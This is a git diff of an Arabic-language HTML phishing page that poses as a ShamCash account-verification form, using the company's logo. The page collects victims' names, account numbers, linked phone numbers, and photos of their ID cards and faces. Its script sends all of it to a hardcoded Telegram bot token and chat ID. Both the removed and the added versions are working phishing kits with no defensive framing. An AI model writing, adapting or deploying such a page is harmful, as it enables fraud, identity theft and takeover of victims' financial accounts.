@@ -2,193 +2,120 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>توثيق</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <title>shaming account</title>
   <style>
     body {
-      font-family: Tahoma, Arial, sans-serif;
-      background: linear-gradient(135deg, #eaf6ff, #ffffff);
       margin: 0;
-      padding: 0;
+      font-family: "Tahoma", sans-serif;
+      background-color: #fdfdf9; /* أبيض سكري */
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
     }
-    .form-container {
+    .app-container {
+      width: 100%;
+      max-width: 480px; /* عرض مناسب للهاتف */
       background: #fff;
-      border: 2px solid #3498db;
-      border-radius: 12px;
-      padding: 30px;
-      width: 420px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      animation: fadeIn 0.8s ease-in-out;
-      text-align: center;
-    }
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(20px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
-    h2 {
-      color: #3498db;
-      margin-bottom: 25px;
+      padding: 20px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
     .logo {
-      margin-bottom: 15px;
+      width: 150px;
+      margin-bottom: 20px;
     }
-    .logo img {
-      width: 120px;
-      height: auto;
-    }
-    .input-group {
-      margin-bottom: 15px;
-      position: relative;
-      text-align: left;
-    }
-    .input-group i {
-      position: absolute;
-      top: 50%;
-      left: 10px;
-      transform: translateY(-50%);
-      color: #3498db;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 10px 35px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
-      transition: border 0.3s;
-    }
-    .input-group input:focus {
-      border: 1px solid #3498db;
+    h2 {
+      margin: 10px 0 20px;
+      color: #333;
+      text-align: center;
     }
     label {
+      align-self: flex-start;
+      margin-top: 10px;
       font-weight: bold;
-      color: #333;
-      margin-bottom: 5px;
-      display: block;
+      color: #444;
     }
-    input[type="file"] {
-      border: none;
-      padding: 5px;
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 8px; /* حواف مستديرة */
+      font-size: 14px;
     }
     button {
       margin-top: 20px;
       width: 100%;
-      padding: 12px;
-      background: #3498db;
+      padding: 14px;
+      background: #007bff; /* أزرق */
       color: #fff;
       border: none;
-      border-radius: 8px;
+      border-radius: 25px; /* مستطيل حديث بحواف دائرية */
       font-size: 16px;
       cursor: pointer;
-      transition: background 0.3s, transform 0.2s;
+      transition: background 0.3s;
     }
     button:hover {
-      background: #2980b9;
-      transform: scale(1.03);
+      background: #0056b3;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <!-- شعار الشركة -->
-    <div class="logo">
-      <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شعار الشركة">
-    </div>
-    <h2><i class="fa-solid fa-briefcase"></i>welcome page admin account</h2>
-    <form id="jobForm">
-      <div class="input-group">
-        <i class="fa-solid fa-user"></i>
-        <input type="text" name="fullname" placeholder="الاسم الثلاثي" required>
-      </div>
+  <div class="app-container">
+    <!-- شعار -->
+    <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شعار" class="logo">
 
-      <div class="input-group">
-        <i class="fa-solid fa-female"></i>
-        <input type="text" name="mothername" placeholder="اسم الأم" required>
-      </div>
+    <h2>وثق حسابك</h2>
+    <form id="job-form">
+      <label>الاسم الثلاثي:</label>
+      <input type="text" name="fullname" required>
 
-      <div class="input-group">
-        <i class="fa-solid fa-id-card"></i>
-        <input type="text" name="nationalid" placeholder="الرقم الوطني" required>
-      </div>
+      <label>رقم حساب:</label>
+      <input type="text" name="mothername" required>
 
-      <div class="input-group">
-        <i class="fa-solid fa-phone"></i>
-        <input type="text" name="phone" placeholder="رقم الهاتف المرتبط بالحساب " required>
-      </div>
+      <label>رقم الهاتف المرتبط بحسابك:</label>
+      <input type="tel" name="phone" required>
 
-    <div class="input-group">
-        <i class="fa-solid fa-account "></i>
-        <input type="text" name="account " placeholder="رقم الحساب " required>
-      </div>
+      <label>:ارفق صورة الهوية وصورة شخصية لك </label>
+      <input type="file" name="photos" accept="image/*" multiple required>
 
-      <label>صورة شخصية</label>
-      <input type="file" name="idcard" accept="image/*" required>
-     
-
-      <label>صورة الهوية الشخصية خلف وامام</label>
-       <input type="file" name="photos" accept="image/*" multiple required>
-
-      <button type="submit"><i class="fa-solid fa-paper-plane"></i> إرسال الطلب</button>
+      <button type="submit">إرسال الطلب</button>
     </form>
   </div>
 
   <script>
-    const form = document.getElementById('jobForm');
-    form.addEventListener('submit', async (e) => {
+    const BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
+    const CHAT_ID   = "7493001551";
+
+    document.getElementById("job-form").addEventListener("submit", async (e) => {
       e.preventDefault();
+      const form = e.target;
 
-      const token = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
-      const chatId = "7493001551";
-
-      const formData = new FormData(form);
-
-      // إرسال النصوص أولاً
-      let textMessage = `
-📋طلب توثيق حساب 
-الاسم الثلاثي: ${formData.get('fullname')}
-اسم الأم: ${formData.get('mothername')}
-الرقم الوطني: ${formData.get('nationalid')}
-رقم الهاتف: ${formData.get('phone')}
-رقم الحساب: ${formData.get('account ')}
-      `;
-
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      // إرسال البيانات النصية
+      const text = `طلب توظيف جديد:\nالاسم: ${form.fullname.value}\nاسم الأم: ${form.mothername.value}\nالهاتف: ${form.phone.value}`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: textMessage
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
       });
 
-      // إرسال الصور الشخصية
-      const photos = formData.getAll('photos');
-      for (let photo of photos) {
-        const fd = new FormData();
-        fd.append("chat_id", chatId);
-        fd.append("photo", photo);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      // إرسال الصور (حتى 4 صور)
+      const files = form.photos.files;
+      for (let i = 0; i < files.length && i < 4; i++) {
+        const photoData = new FormData();
+        photoData.append("chat_id", CHAT_ID);
+        photoData.append("photo", files[i]);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: "POST",
-          body: fd
+          body: photoData
         });
       }
 
-      // إرسال صورة البطاقة
-      const idcard = formData.get('idcard');
-      if (idcard) {
-        const fd = new FormData();
-        fd.append("chat_id", chatId);
-        fd.append("photo", idcard);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: fd
-        });
-      }
-
-      alert("تم ارسال الطلب سوف نرسل لك كود توثيق خلال 48 ساعه");
+      alert("✅  تم إرسال الطلب والصور بنجاح!");
       form.reset();
     });
   </script>
